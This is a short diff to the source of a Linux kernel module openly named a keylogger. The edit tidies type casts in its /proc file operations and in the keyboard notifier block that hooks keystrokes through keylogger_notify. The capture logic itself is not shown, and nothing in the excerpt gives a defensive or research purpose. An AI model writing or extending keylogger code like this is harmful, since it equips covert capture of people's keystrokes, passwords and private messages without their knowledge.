@@ -17,10 +17,9 @@ static ssize_t keylogger_proc_write(struct file *file, const char __user *buffer
 
 static const struct file_operations keylogger_proc_fops = {
     .owner = THIS_MODULE,
-    .open = (int (*)(struct inode *, struct file *)) keylogger_proc_open,
-    .write = (ssize_t (*)(struct file *, const char __user *, size_t, loff_t *)) keylogger_proc_write,
+    .open = keylogger_proc_open,
+    .write = keylogger_proc_write,
 };
-
 
 static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
@@ -61,5 +60,5 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your Name");
 
 static struct notifier_block keylogger_nb = {
-    .notifier_call = (int (*)(struct notifier_block *, unsigned long, void *)) keylogger_notify
+    .notifier_call = keylogger_notify
 };
